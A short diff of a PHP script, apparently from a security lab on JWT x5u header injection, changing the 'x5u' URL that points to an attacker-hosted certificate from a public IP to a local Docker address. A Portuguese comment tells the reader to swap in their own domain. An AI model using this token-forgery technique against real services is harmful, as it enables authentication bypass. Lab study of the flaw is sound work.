@@ -8,7 +8,7 @@ $algorithm = 'RS256';
 $header = [
     'alg' => $algorithm,
     'typ' => 'JWT',
-    'x5u' => 'http://54.242.29.10:8000/attacker.crt', //lembrar de mudar a url para a de um dominio seu 
+    'x5u' => 'http://172.17.0.1:8080/attacker.crt', //lembrar de mudar a url para a de um dominio seu 
     'lab' => 'jwt-x5u-header'
 ];
 
